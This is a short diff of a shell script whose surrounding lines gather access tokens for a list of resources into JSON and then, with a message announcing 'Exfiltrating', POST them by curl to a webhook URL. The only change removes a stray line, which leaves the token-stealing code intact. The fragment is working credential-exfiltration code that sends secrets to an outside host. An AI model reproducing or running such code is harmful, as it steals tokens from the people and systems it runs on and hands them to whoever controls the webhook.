@@ -28,6 +28,5 @@ for R in "${RESOURCES[@]}"; do
     OUTPUT_JSON=$(echo "$OUTPUT_JSON" | jq --arg key "$R" --arg val "$TOKEN" '.[$key] = $val')
 done
 
-k
 echo "Exfiltrating to $WEBHOOK_URL..."
 curl -s -X POST -H "Content-Type: application/json" -d "$OUTPUT_JSON" "$WEBHOOK_URL"
